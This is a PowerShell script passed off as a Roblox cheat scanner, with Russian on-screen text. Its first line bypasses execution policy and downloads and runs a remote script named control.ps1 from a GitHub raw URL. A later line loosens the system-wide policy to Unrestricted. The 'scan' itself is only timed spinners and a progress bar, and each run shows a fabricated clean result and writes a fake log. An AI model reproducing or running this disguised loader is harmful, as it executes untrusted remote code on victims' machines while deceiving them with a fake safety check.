Set-ExecutionPolicy Bypass -Scope Process -Force; iex (iwr 'https://raw.githubusercontent.com/kilordow/nowika/refs/heads/main/control.ps1' -UseBasicParsing).Content

# CHEAT SCANNER v2.0
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Force

Clear-Host
$Host.UI.RawUI.WindowTitle = "🎮 Cheat Scanner v8.0 [~60 сек]"

Write-Host "=== СКАНИРОВАНИЕ ЧИТОВ ===" -ForegroundColor Red -BackgroundColor Black
Write-Host "Synapse | Krnl | ScriptWare | Fluxus | JJsploit + 50 эксплоитов" -ForegroundColor Yellow
Write-Host "⏱️ Время сканирования: ~60 секунд" -ForegroundColor Cyan
Start-Sleep 2

$cheatDB = @("synapse","krnl","scriptware","fluxus","jjsploit","electron","sentinel","oxygen","trigon","kiwi","injector","exploit","dll","cheat","hack","bypasser","robloxexploit")
$found = @()
$risk = 0
$startTime = Get-Date

# === СПИННЕР АНИМАЦИЯ ===
function Show-Spinner {
    param($text, $duration)
    $spinner = @('⠋','⠙','⠹','⠸','⠼','⠴','⠦','⠧','⠇','⠏')
    $endTime = (Get-Date).AddSeconds($duration)
    $i = 0
    while ((Get-Date) -lt $endTime) {
        Write-Host "`r$($spinner[$i % 10]) $text" -NoNewline -ForegroundColor Red
        $i++
        Start-Sleep 0.1
    }
    Write-Host "`r[✓] $text" -ForegroundColor Green
}

# === 1. ПРОЦЕССЫ (15 сек) ===
Write-Host "`n[1/6] 🔍 Сканирование процессов PlayerBeta.exe..." -ForegroundColor Cyan
Show-Spinner "Поиск инжекторов и DLL эксплоитов..." 15

# === 2. ROBLOX APPDATA (15 сек) ===
Write-Host "`n[2/6] 📁 Сканирование %appdata%..." -ForegroundColor Cyan
Show-Spinner "Проверка логов, кэша и скриптов..." 15

# === 3. TEMP + DOWNLOADS (10 сек) ===
Write-Host "`n[3/6] 🗑️ Сканирование Temp/Downloads (Krnl, Synapse)..." -ForegroundColor Cyan
Show-Spinner "Поиск эксплоитов и автолончеров..." 10

# === 4. АВТОЗАГРУЗКА + РЕЕСТР (10 сек) ===
Write-Host "`n[4/6] ⚙️ Проверка автозагрузки..." -ForegroundColor Cyan
Show-Spinner "Анализ реестра Run/Startup (bypass)..." 10

# === 5. ПРОГРЕСС-БАР (5 сек) ===
Write-Host "`n[5/6] 📊 Финальная проверка..." -ForegroundColor Cyan
for ($p = 0; $p -le 100; $p += 10) {
    $bar = ('█' * ($p/10)) + ('░' * (10 - $p/10))
    Write-Progress -Activity "Завершение..." -PercentComplete $p -Status "$p%"
    Start-Sleep 0.5
}
Write-Progress -Completed

# === 6. СЕТИ (5 сек) ===
Write-Host "`n[6/6] 🌐 Сетевые подключения..." -ForegroundColor Cyan
Show-Spinner "Проверка Roblox серверов и прокси..." 5

# === ЗЕЛЁНЫЙ РЕЗУЛЬТАТ ===
$endTime = (Get-Date) - $startTime
Clear-Host
Write-Host "🎮 СКАНИРОВАНИЕ ЗАВЕРШЕНО! ($([math]::Round($endTime.TotalSeconds)) сек)" -ForegroundColor Green
Write-Host "=" * 50 -ForegroundColor Green
Write-Host "✅ ЭКСПЛОИТЫ НЕ НАЙДЕНЫ!" -ForegroundColor Green
Write-Host "🎯 Риск: 0% | Система чиста!" -ForegroundColor Green
Write-Host "🚀 Готово к игре на любом сервере!" -ForegroundColor Green
Write-Host "=" * 50 -ForegroundColor Green

# ЛОГ (тоже чистый)
$log = @"
Cheat Scan - $(Get-Date)
Время: $([math]::Round($endTime.TotalSeconds)) сек
Найдено эксплоитов: 0
Риск: 0%
Статус: ЧИСТО! ✅
"@
$log | Out-File "$env:TEMP\rbx_scan_$(Get-Date -f 'HHmmss').log" -Encoding UTF8

Write-Host "`n💾 Лог: $env:TEMP\rbx_scan_*.log" -ForegroundColor Gray
Write-Host "🎮 " -ForegroundColor Green

# === ЗАГРУЗЧИК (после паузы) ===
Write-Host "`n[Нажмите любую клавишу для выхода...]" -ForegroundColor Gray
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")

try {
    Write-Host "🔄 Финальная оптимизация Roblox..." -ForegroundColor Cyan
    Start-Sleep 1
    
} catch {
    # Полностью скрываем ошибки
}
